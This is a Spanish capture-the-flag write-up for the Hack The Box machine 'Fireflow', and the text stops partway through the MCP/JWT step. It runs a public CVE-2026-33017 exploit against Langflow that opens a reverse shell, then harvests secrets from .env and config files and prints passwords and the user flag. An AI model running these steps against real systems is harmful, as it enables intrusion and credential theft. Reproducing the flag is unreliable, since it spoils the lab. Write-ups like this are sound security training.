
# Fireflow WriteUp - Hack The Box
- **ID**: `fireflow`
- **Date**: `12/10/2026`
- **Level**: `Medium`
- **OS**: `Linux`
- **IP**: `10.129.127.154`
- **Tags**: `Kubernetes`, `Node Exporter`, `RCE`, `HostPath`, `CVE-2026-33017`

## Executive Summary
Fireflow es una máquina Linux de dificultad fácil enfocada en entornos de contenedores. La intrusión inicial se logra comprometiendo un servicio expuesto para ejecutar código de manera remota. Posteriormente, se aprovecha una mala configuración en un contenedor privilegiado de `node-exporter` (que cuenta con el sistema de archivos del host montado en la raíz mediante `hostPath: /`) para leer archivos sensibles y escalar privilegios de forma completa sobre el sistema subyacente.

---

## Reconocimiento
La primera fase consiste en identificar la disponibilidad del objetivo, descubrir los puertos expuestos y determinar qué servicios están ejecutándose.

### Ping 
Lo primero que haremos es saber si tenemos conexión con la máquina victima y saber a qué sistema operativo nos enfrentamos.
Ejecutamos:
```bash 
ping -c 1 10.129.244.214
```
Resultado:
```bash
PING 10.129.244.214 (10.129.244.214) 56(84) bytes of data.
64 bytes from 10.129.244.214: icmp_seq=1 ttl=63 time=176 ms

--- 10.129.244.214 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 176.397/176.397/176.397/0.000 ms
```
Como lo devuelve el comando anterior, tenemos conexión y estamos contra una máquina con sistema operativo `Linux`, ya sabemos que es porque el **TTL** nos dice a que nos enfrentamos, no siempre es lo mismo, pero cuando es cercano a **64** sabemos que es una máquina `Linux`, en caso contrario si se acerca a **128** es una máquina `Windows`.

### Nmap
Ahora vamos a mirar que puertos tiene esta máquina abiertos, para ello usamos el siguiente comando **Nmap**:
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.214 -oG allPorts
```
Los parámetros utilizados son los siguientes:
| Parámetro | Descripción |
|-----|----|
| `-p-` | Indica que queremos escanear los 65535 puertos de la máquina víctima. |
| `--open` | Indicamos que solo queremos que nos devuelva qué puertos están abiertos. |
| `-sS` | Escaneo de tipo TCP SYN para ser rápidos y obtener suficiente información. |
| `--min-rate 5000`: Envía 5000 paquetes por segundo. |
| `-vvv` | Triple verbose para agilizar la salida por pantalla. |
| `-n` | Desactiva la resolución DNS. |
| `-Pn` | Omite el descubrimiento de host, asumiendo que está activo. |
| `10.129.244.214` | IP de la máquina víctima. |
| `-oG` | Genera un archivo de tipo Grepable para procesamiento posterior. |
| `allPorts` | Nombre con el que se guarda la salida de Nmap. |

Resultado:
```javascript
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2026-10-10 09:38 -05
Initiating SYN Stealth Scan at 09:38
Scanning 10.129.244.214 [65535 ports]
Discovered open port 443/tcp on 10.129.244.214
Discovered open port 22/tcp on 10.129.244.214
Completed SYN Stealth Scan at 09:38, 16.13s elapsed (65535 total ports)
Nmap scan report for 10.129.244.214
Host is up, received user-set (0.23s latency).
Scanned at 2026-10-10 09:38:11 -05 for 16s
Not shown: 62064 closed tcp ports (reset), 3469 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.54 seconds
           Raw packets sent: 79098 (3.480MB) | Rcvd: 68206 (2.728MB)
```
De aquí podemos obtener dos puertos importantes y esenciales para poder conectarnos a la máquina:
| Puerto | Función |
|---|---|
| `22` | Permite la conexión remota mediante **SSH (Secure Shell)** para acceder al sistema más adelante. |
| `443` | Puerto empleado para el servicio **HTTPS**. |

Ahora, utilizando otra vez Nmap, vamos a inspeccionar los servicios y versiones en dichos puertos:
```bash
sudo nmap -p22,443 -sCV 10.129.244.214 -oN targeted
```
Los parámetros utilizados son los siguientes:
| Parámetro | Descripción |
|---|---|
| `-p22,443` | Puertos a escanear |
| `-sCV` | Abreviación de `-sC` con el cuál indicamos que usaremos los `scripts predeterminados` de **Nmap** y el `-sV` indicandole que queremos saber las versiones de los servicios que corren en los puertos elegidos. |
| `10.129.244.214` | IP de la máquina víctima. |
| `-oN` | Archivo del tipo **Nmap**, osea del tipo normal. |
| `targeted` | Nombre con el que se guarda la salida de Nmap. |

Resultado:
```javascript
Starting Nmap 7.92 ( https://nmap.org ) at 2026-10-10 09:41 -05
Nmap scan report for 10.129.244.214
Host is up (0.31s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp open  ssl/http nginx
|_http-title: Did not follow redirect to https://fireflow.htb/
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds
```
Con todo, ahora sabemos que el servicio del puerto `22` es **OpenSSH** y con versión `9.6p1`, además de que también encontramos que es una máquina `Ubuntu`, la cual es muy común en estos desafíos.
Ahora también encontramos que el `443` maneja **Nginx**, el cual maneja el servicio Web bajo un entorno seguro mediante **SSL/TLS**.
El servicio web realiza una redirección hacia: https://fireflow.htb/.

### Dominio local
Vamos a agregar esa **Url** a nuestro host, para poder acceder a ella, de lo contrario no podríamos. Ejecutamos lo siguiente:
```bash
echo "10.129.244.214 fireflow.htb" | sudo tee -a /etc/hosts
```
Y miramos si todo va bien:
```bash
cat /etc/hosts
# Hack The Box
10.129.244.214 fireflow.htb
```

---

## Enumeration
Con el dominio configurado, comenzamos a investigar la aplicación web. El objetivo es identificar tecnologías, rutas accesibles, paneles administrativos y posibles puntos de entrada.

### Web
Entramos a `https://fireflow.htb`, nos saldrá bloqueada la página, entonces damos en Avanzado y damos continuar con el riesgo, y ya podremos acceder a la página:
![Descubrimiento web](/images/machines/fireflow/img-01.png)
Mirando hay un botón el cuál nos lleva a un agente de IA, pero al mirar que contiene la página encontré el **HTML** del botón: 
```javascript
<div style="text-align:center">
    <a href="https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25"
        target="_blank" class="btn">Open Agent &rarr;</a>
    <div class="btn-sub">Runs in Nightfall flow runner</div>
</div>
```
Es un enlace directo al agente de IA.
Ahora tenemos que agregarlo a nuestros hosts:

```bash
echo "10.129.244.214 fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts
```
Y verificamos:
```bash
cat /etc/hosts
# Hack The Box
10.129.244.214 fireflow.htb
10.129.244.214 fireflow.htb flow.fireflow.htb
```

### Web de agente de IA
Vamos a intentar acceder a ese subdominio https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25, nuevamente nos dice para aceptar el riesgo, lo aceptamos y continuamos.
![Agente de IA](/images/machines/fireflow/img-02.png)
La página nos muestra como una copia de **ChatGPT**.

Cuando probé escribir algo, me respondió lo siguiente:

![Respuesta Agente de IA](/images/machines/fireflow/img-03.png)

### Analizando el comportamiento del flujo

Al enviar un mensaje desde la interfaz web, la aplicación siempre devolvía la misma respuesta: *"We are extremely sorry, this is still under development. Please, check back soon..."*. Esto sugería que el flujo estaba modificando el mensaje antes de mostrarlo.

Para entender qué ocurría, abrí las herramientas de desarrollo del navegador y examiné la petición que se enviaba al pulsar el botón de enviar.

### Reproduciendo la petición con CURL

La solicitud utilizaba el endpoint `/api/v1/build_public_tmp/{flow_id}/flow`. Reproduje la petición con `curl`, conservando los encabezados relevantes y el identificador de cliente:

```bash
curl -k -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?start_component_id=ChatInput-608En&log_builds=false&event_delivery=streaming" -H "Content-Type: application/json" -H "Origin: https://flow.fireflow.htb" -H "Referer: https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25" \
  -H "Cookie: client_id=54b976f9-3d6e-448b-b7f0-86d9e87525a7" \
  -d '{
    "data": {
      "nodes": [],
      "edges": []
    },
    "input_value": "Hello, how are you?"
  }'
```
Resultado:
```json
{
  "job_id": "838593e8-3c3c-48e8-a9ce-cdaf61891ccb"
}
```

El servidor había aceptado la solicitud y devuelto un identificador de trabajo. Sin embargo, todavía necesitaba comprobar qué había ocurrido durante su ejecución.

### Consultando los eventos del trabajo

Utilicé el `job_id` para consultar los eventos asociados a la ejecución:

```bash
curl -sk -N "https://flow.fireflow.htb/api/v1/build_public_tmp/838593e8-3c3c-48e8-a9ce-cdaf61891ccb/events?event_delivery=streaming" -H "Cookie: client_id=54b976f9-3d6e-448b-b7f0-86d9e87525a7"
```

La respuesta fue:

```json
{"event": "vertices_sorted", "data": {"ids": [], "to_run": []}}
{"event": "build_start", "data": {}}
{"event": "end", "data": {"build_duration": 0}}
```

Los eventos mostraban que el trabajo había terminado sin ejecutar componentes. La razón estaba en el cuerpo de la solicitud: había enviado `nodes` y `edges` vacíos.

Esto me llevó a investigar cómo estaba construido el flujo original y qué datos esperaba recibir el endpoint.

> **Nota sobre los parámetros:** `-k` permite a `curl` aceptar certificados TLS que no puede validar; `-N` desactiva el búfer de salida; y `event_delivery=streaming` solicita la entrega de eventos en modo streaming.

### Inspeccionando la configuración del flujo

Volví a las herramientas de desarrollo del navegador. Mediante la opción **Editar y reenviar** de la petición, pude inspeccionar el cuerpo original de la solicitud y localizar la configuración de los componentes.

El flujo contenía tres componentes principales:

```text
ChatInput
    |
    v
TextOperations
    |
    v
ChatOutput
```

- **ChatInput:** recibe el mensaje del usuario.
- **TextOperations:** transforma el texto recibido.
- **ChatOutput:** entrega el resultado procesado.

El componente `TextOperations` tenía una configuración especialmente relevante:

| Campo | Valor |
|---|---|
| `operation` | `Text Replace` |
| `search_pattern` | `^.*$` |
| `replacement_text` | `We are extremely sorry, this is still under development. Please, check back soon...` |
| `use_regex` | `true` |

El patrón `^.*$`, al utilizarse como expresión regular, coincide con el contenido de una línea completa. Como el texto de reemplazo era un mensaje fijo, el componente explicaba por qué la aplicación respondía siempre de la misma manera.

La lógica de reemplazo de Python era similar a esta:

```python
if use_regex:
    try:
        return re.sub(search_pattern, replacement_text, text)
    except re.error:
        return text
```

Ya tenía una explicación para el comportamiento de la interfaz. El siguiente paso consistía en comprobar si podía modificar la configuración del flujo desde la petición y observar el resultado.

### Modificando la configuración del flujo

Para realizar la prueba, preparé un script llamado `test_flow.py`. En lugar de enviar nodos y aristas vacíos, cargué una copia de la configuración original del flujo y modifiqué únicamente el valor `replacement_text` del componente `Text Operations`.

El objetivo era comprobar si el servidor utilizaba la configuración que yo enviaba o si imponía la configuración original.

#### Preparando la prueba

El archivo `/tmp/agent-dev.json` contenía la configuración del flujo que había obtenido durante la inspección de la petición original.

El script fue el siguiente:

```python
import copy
import json
import ssl
import urllib.error
import urllib.request

BASE = "https://flow.fireflow.htb"
FLOW_ID = "7d84d636-af65-42e4-ac38-26e867052c25"

with open("/tmp/agent-dev.json", encoding="utf-8") as f:
    flow = json.load(f)

# Copiar la configuración para no modificar el objeto original.
flow = copy.deepcopy(flow)

# Cambiar únicamente el texto de reemplazo.
for item in flow["data"]["nodes"]:
    node = item["data"]["node"]

    if node.get("display_name") == "Text Operations":
        template = node["template"]
        template["replacement_text"]["value"] = "HTB_CONFIG_TEST"

payload = {
    "data": flow["data"],
    "inputs": {
        "input_value": "Hola",
        "type": "chat"
    }
}

url = (
    f"{BASE}/api/v1/build_public_tmp/{FLOW_ID}/flow"
    "?start_component_id=ChatInput-608En"
    "&event_delivery=streaming"
)

body = json.dumps(payload).encode()

request = urllib.request.Request(
    url,
    data=body,
    headers={
        "Content-Type": "application/json",
        "Cookie": "client_id=54b976f9-3d6e-448b-b7f0-86d9e87525a7"
    },
    method="POST"
)

context = ssl._create_unverified_context()

try:
    with urllib.request.urlopen(
        request,
        context=context,
        timeout=15
    ) as response:
        print("HTTP:", response.status)
        print(response.read().decode())

except urllib.error.HTTPError as exc:
    print("HTTP:", exc.code)
    print("Respuesta del servidor:")
    print(exc.read().decode("utf-8", errors="replace"))

except Exception as exc:
    print(type(exc).__name__, exc)
```

El contexto TLS sin verificación se utilizó para poder realizar la petición dentro del laboratorio con el certificado presentado por el servicio.

#### Ejecutando la prueba

Ejecuté el script:

```bash
python test_flow.py
```

El servidor respondió:

```text
HTTP: 200
{"job_id":"ecece951-45c8-4f51-9b0f-5d79acc27ee1"}
```

Para comprobar el resultado real, consulté los eventos de ese trabajo:

```bash
curl -sk -N -H 'Cookie: client_id=54b976f9-3d6e-448b-b7f0-86d9e87525a7' 'https://flow.fireflow.htb/api/v1/build_public_tmp/ecece951-45c8-4f51-9b0f-5d79acc27ee1/events'
```

Entre los eventos recibidos aparecía:

```json
{
  "event": "end_vertex",
  "data": {
    "build_data": {
      "id": "TextOperations-yvwhG",
      "valid": true,
      "data": {
        "outputs": {
          "message": {
            "message": "HTB_CONFIG_TEST",
            "type": "text"
          }
        }
      }
    }
  }
}
```

La salida del componente contenía `HTB_CONFIG_TEST`, el valor que había enviado en mi petición.

**Conclusión:** pude modificar la configuración del flujo y comprobar que el servidor procesaba el valor suministrado. Esto confirmaba que tenía control sobre la salida del componente, aunque todavía no demostraba ejecución remota de comandos.

### Identificando posible vulnerabilidad

Con el comportamiento del endpoint entendido, investigué la versión del framework utilizado por la aplicación. Durante el análisis identifiqué **Langflow 1.8.2** y encontré una referencia a la vulnerabilidad **CVE-2026-33017**:

[CVE-2026-33017 — registro de CVE.org](https://www.cve.org/CVERecord?id=CVE-2026-33017)

La referencia que estaba investigando describía una posible **Remote File Inclusion(RCE)** relacionada con **Langflow**.

Antes de continuar, era importante distinguir entre dos hallazgos:

1. La manipulación del flujo, que ya había validado con `HTB_CONFIG_TEST`.
2. La posible ejecución de comandos en el servidor, que aún debía comprobar.

La coincidencia de la versión y del endpoint constituía una pista para continuar la investigación, pero no bastaba por sí sola para demostrar que la vulnerabilidad fuera explotable en esta instancia.

### Obteniendo una shell en el servidor

Para validar la hipótesis, preparé `exploit.py` que encontré en https://github.com/EQSTLab/CVE-2026-33017/blob/main/exploit.py y adapté la configuración **TLS** de la petición **HTTP** para utilizar `verify=False`.

En el script:

```python
resp = requests.post(
    endpoint,
    json=build_payload(args.lhost, args.lport),
    cookies={"client_id": "poc"},
    timeout=args.timeout,
    verify=False
)
```

Esta modificación permite que la petición continue pese a que el certificado **TLS** no pueda validarse. No es, por sí misma, lo que provocaba la ejecución remota.

### Preparando la conexión inversa

Primero consulté las interfaces de red para identificar la dirección de la interfaz `tun0`, utilizada para comunicarme con el laboratorio:

```bash
ip addr
```

Después ejecuté el script con la dirección de mi interfaz VPN y el puerto de escucha:

```bash
python3 exploit.py --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 --lhost <TU_IP_TUN0> --lport 4444 --listen
```

El script mostró:

```text
[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
[*] Callback: <TU_IP>:4444
[*] Listening on 0.0.0.0:4444...

[!] SHELL ESTABLISHED FROM 10.129.244.214:53322
```

La conexión inversa se estableció desde `10.129.244.214`. El tiempo de espera de la petición HTTP no impidió que la conexión llegara al listener.

### Verificando el contexto de ejecución

Una vez obtenida la shell, ejecuté:
```bash
whoami
```
Resultado:
```text
www-data
```
Después comprobé los permisos del proceso:
```bash
id
```
Resultado:
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Había confirmado la ejecución de comandos en el servidor con los privilegios del usuario `www-data`.
La shell no tenía control de trabajo ni una terminal interactiva completa, como indicaban los mensajes:

```text
bash: cannot set terminal process group (1518): Inappropriate ioctl for device
bash: no job control in this shell
```
A pesar de esas limitaciones, pude ejecutar comandos y explorar el sistema de archivos.

### Buscando información de configuración

Con acceso al servidor, empecé a revisar los archivos disponibles para identificar información que permitiera continuar la enumeración.

### Inspeccionando el directorio de Langflow

La shell se encontraba en `/var/lib/langflow`. Ejecuté:

```bash
ls -la
```
El resultado mostraba:
```bash
total 20
drwxr-xr-x  4 www-data www-data 4096 May 12 15:28 .
drwxr-xr-x 53 root     root     4096 May 12 15:56 ..
drwxr-xr-x  2 www-data www-data 4096 May 12 15:28 ba4fe756-d6f7-4c7a-a7b1-f986206878ec
-rw-r--r--  1 root     root        0 Apr  9  2026 langflow.db
drwxr-xr-x  4 www-data www-data 4096 May 12 15:28 profile_pictures
-rw-------  1 www-data www-data   43 Oct 11 22:21 secret_key
```

El archivo `secret_key` llamó mi atención porque contenía una clave asociada a la configuración de Langflow.

Lo consulté:

```bash
cat secret_key
XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

### Localizando el archivo `.env`

El siguiente paso fue buscar archivos de configuración del servicio:

```bash
find / -name ".env" 2>/dev/null
```
La búsqueda devolvió:
```bash
/etc/langflow/.env
```
Consulté su contenido:
```bash
cat /etc/langflow/.env
```
El archivo contenía:
```dotenv
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```
Encontré unas credenciales configuradas para la cuenta administrativa de Langflow:

- **Usuario:** `langflow`
- **Contraseña:** `n1ghtm4r3_b4_n1ghtf4ll`

Estas credenciales correspondían a la aplicación. Todavía no sabía si también serían válidas para otros servicios del sistema.

### Comprobando si las credenciales servían para SSH

Probemos las credenciales:
```bash
ssh langflow@10.129.244.214
langflow@10.129.244.214's password:
Permission denied, please try again.
```
El intento falló. Necesitamos encontrar un usuario válido.

### Enumerando los directorios de usuarios
Emploremos los directorios superiores para localizar usuarios:
```bash
cd ..
ls
```
Encontramos `home`. Entremos y listemos lo que contiene:
```bash
cd /home
ls
```
Hay un usuario llamado `nightfall`. 

### Acceso por SSH
Intentamos conectarnos con ese usuario:
```bash
ssh nightfall@10.129.244.214 
nightfall@10.129.244.214's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Oct 12 01:18:12 AM UTC 2026

  System load:           0.01
  Usage of /:            85.1% of 15.58GB
  Memory usage:          51%
  Swap usage:            0%
  Processes:             241
  Users logged in:       0
  IPv4 address for eth0: 10.129.244.214
  IPv6 address for eth0: dead:beef::a0de:adff:fe2f:b6e0

  => / is using 85.1% of 15.58GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
nightfall@fireflow:~$ 
```
Ahora tenemos acceso.
Vamos comprobar nuestro directorio:
```bash
ls
```
Encontramos:
```javascript
user.txt
```
Y obtenemos la flag:
```bash
cat user.txt
```
Resultado: `f0c8491d2ee5405db110db58e33b8219`

## Exploitation
El objetivo de esta fase es identificar un servicio, una configuración o una vulnerabilidad que permita pasar de la cuenta `nightfall` a una sesión con privilegios de `root`.

### Enumeración del sistema
```bash
nightfall@fireflow:~$ sudo -l
[sudo] password for nightfall: 
Sorry, user nightfall may not run sudo on fireflow.
```
No dejó de esta manera.
Revisamos binarios, si hay alguno que sirva:
```bash
nightfall@fireflow:~$ find / -perm -4000 2>/dev/null
```
Resultado:
```bash
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```
No hay ninguno.
Miramos las capabilities:
```bash
nightfall@fireflow:~$ getcap -r / 2>/dev/null
```
Resultado:
```bash
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
```
Pero no hay nada que nos interese.
Miremos los procesos que se están ejecutando:
```bash
nightfall@fireflow:~$ ss -tlnp
```
Resultados:
```bash
State          Recv-Q         Send-Q                 Local Address:Port                  Peer Address:Port         Process         
LISTEN         0              2048                       127.0.0.1:7860                       0.0.0.0:*                            
LISTEN         0              4096                       127.0.0.1:10010                      0.0.0.0:*                            
LISTEN         0              4096                       127.0.0.1:36737                      0.0.0.0:*                            
LISTEN         0              4096                      127.0.0.54:53                         0.0.0.0:*                            
LISTEN         0              511                          0.0.0.0:443                        0.0.0.0:*                            
LISTEN         0              4096                         0.0.0.0:22                         0.0.0.0:*                            
LISTEN         0              4096                   127.0.0.53%lo:53                         0.0.0.0:*                            
LISTEN         0              4096                       127.0.0.1:10249                      0.0.0.0:*                            
LISTEN         0              4096                       127.0.0.1:10248                      0.0.0.0:*                            
LISTEN         0              4096                       127.0.0.1:10257                      0.0.0.0:*                            
LISTEN         0              4096                       127.0.0.1:10256                      0.0.0.0:*                            
LISTEN         0              4096                       127.0.0.1:10259                      0.0.0.0:*                            
LISTEN         0              4096                       127.0.0.1:10258                      0.0.0.0:*                            
LISTEN         0              4096                       127.0.0.1:6444                       0.0.0.0:*                            
LISTEN         0              4096                               *:9100                             *:*                            
LISTEN         0              4096                               *:6443                             *:*                            
LISTEN         0              4096                               *:10250                            *:*                            
LISTEN         0              4096                            [::]:22                            [::]:* 
```
Puertos importantes

- `6443`: puerto habitual de la API de Kubernetes.
- `10250`: puerto habitual de la API de kubelet.
- `10248` y `10249`: puertos que pueden utilizar componentes de Kubernetes, dependiendo de la configuración.
- `6444`: puerto adicional que debía investigar para determinar su función.

La presencia de estos puertos, junto con los procesos del sistema, sugiere que la máquina ejecuta un clúster de Kubernetes.

### Comprobando el acceso con kubectl
Probemos si podemos consultar los nodos y pods del clúster:
```bash
kubectl get nodes
kubectl get pods -A
```
Ambos comandos devuelven un error relacionado con la configuración:
```bash
WARN[0000] Unable to read /etc/rancher/k3s/k3s.yaml, please start server with --write-kubeconfig-mode or --write-kubeconfig-group to modify kube config permissions
error: error loading config file "/etc/rancher/k3s/k3s.yaml": open /etc/rancher/k3s/k3s.yaml: permission denied
```
Comprobemos si existe una configuración de Kubernetes en nuestro directorio personal:
```bash
ls -la ~/.kube
```
No existe el directorio `.kube`. 

Buscamos archivos de configuración con el nombre `kubeconfig`:
```bash
find / -name "kubeconfig" 2>/dev/null
```
Pero no hay nada.

### Revisando los permisos de la configuración
Inspeccionamos el archivo señalado por el error:
```bash
ls -la /etc/rancher/k3s/k3s.yaml
```
Resultado:
```text
-rw------- 1 root root 2945 Oct 11 22:25 /etc/rancher/k3s/k3s.yaml
```
Los permisos `600` indican que solamente el propietario, `root`, puede leer y modificar el archivo. Esto explica el error de permisos que recibimos al utilizar `kubectl`.

A continuación, buscamos archivos **YAML** y tokens en los directorios de configuración de **Rancher**:
```bash
find /var/lib/rancher \( -name "*.yaml" -o -name "*.token" \) 2>/dev/null
find /etc/rancher -ls 2>/dev/null
```
Entre los archivos encontrados aparecían:
```bash
/etc/rancher/node/password
/etc/rancher/k3s/k3s.yaml
/etc/rancher/k3s/config.yaml
```
Tanto el archivo de contraseña del nodo como el `k3s.yaml` tenían permisos restrictivos. Por el momento, no podía utilizarlos directamente.

### Confirmando la ejecución de K3s
Para entender cómo se ejecuta el servicio, revisemos los procesos:
```bash
ps aux | grep '[k]3s'
```
Entramos los resultados destacaba:
```bash
root  7982  5.1 12.4 1772280 501220 ? Ssl Oct11 9:52 /usr/local/bin/k3s server
```
Con esto confirmamos que el servidor **K3s** se estaba ejecutando como `root`. También aparecen varios procesos `containerd-shim-runc-v2`, asociados a la ejecución de contenedores.

Revisemos los binarios disponibles:
```bash
ls -la /usr/local/bin
```
Resultado:
```bash
crictl -> k3s
ctr    -> k3s
helm
k3s
k3s-killall.sh
k3s-uninstall.sh
kubectl -> k3s
websocat
```
Por último miremos `/opt`:
```bash
ls -la /opt
```
Encontramos los siguientes directorios:
```bash
containerd
lab
langflow
```
Hasta este punto, confirmamos que **K3s** se ejecutaba como `root` y que la máquina dispone de herramientas para administrar el clúster. Sin embargo, no hemos conseguido acceso administrativo a Kubernetes: la configuración sigue protegida por permisos del sistema.

### Descubriendo la configuración de MCP

Revisemos los archivos accesibles desde el directorio personal de `nightfall`.

```bash
ls -la ~
```
Encontramos algo llamado `.mcp`:
```text
drwx------ 2 nightfall nightfall 4096 Oct 11 22:19 .mcp
-rw-r----- 1 root nightfall   33 Oct 11 22:20 user.txt
```
Entramos en ese directorio:
```bash
cd ~/.mcp
ls -la
config.json
```
Y miramos el archivo `config.json`:
```json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```
Este hallazgo es muy importante: encontramos credenciales de una cuenta llamada `langflow-bot` y la dirección de un servicio denominado **MCP AI Tool Registry**.

### Consultando la versión y los endpoints de la API de MCP
Utilicemos el endpoint de estado indicado en el archivo de configuración:
```bash
curl -s http://10.129.244.214:30080/api/v1/version
```
Resultado:
```json
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": ["HS256", "none"]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET /api/v1/tools",
    "POST /api/v1/tools [admin]"
  ]
}
```
La respuesta proporciona información útil sobre la superficie de ataque:
- `/api/v1/auth`: endpoint de autenticación.
- `/api/v1/tools`: endpoint para consultar herramientas.
- `POST /api/v1/tools`: endpoint para registrar herramientas, aparentemente reservado para administradores.
- `/mcp`: endpoint para invocar herramientas mediante **JSON-RPC 2.0**.

También se destaca que el servicio declara la admisión de algoritmos **JWT** `HS256` y `none`. Este último merece especial atención porque los tokens **JWT** con `alg: none` no tienen una firma criptográfica.

### Autenticación con las credenciales encontradas
Utilicemos las credenciales de `langflow-bot` para solicitar un token:
```bash
curl -s -X POST \
  http://10.129.244.214:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{
    "username": "langflow-bot",
    "password": "Langfl0w@mcp2026!"
  }'
```
El servicio devuelve un token de acceso **JWT**:
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}
```

El token `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps` esta compuesto por tres segmentos separados por puntos:
```bash
header.payload.signature
```

Para inspeccionar el contenido del token, decodifiquemos. Esta operación permite leer las declaraciones incluidas en el payload, pero no verifica la autenticidad del token ni su firma.

```bash
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps'

printf '%s' "$TOKEN" |
  cut -d '.' -f 2 |
  tr '_-' '/+' |
  base64 -d 2>/dev/null |
  jq
```
El payload decodificado contiene:
```json
{
  "sub": "langflow-bot",
  "role": "user"
}
```
La cuenta autenticada tiene rol de `user`, no `admin`.

### Probando una herramienta disponible

Antes de registrar herramientas, comprobemos que el endpoint **MCP** funcione y que se puede invocar una herramienta con nuestro token legítimo.
Ejecutemos esta petición de `ping_host` contra `127.0.0.1`:

```bash
curl -s -X POST \
  http://10.129.244.214:30080/mcp \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "ping_host",
      "arguments": {
        "target": "127.0.0.1"
      }
    },
    "id": 1
  }'
```
La respuesta incluía la salida del comando `ping`:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "content": [
      {
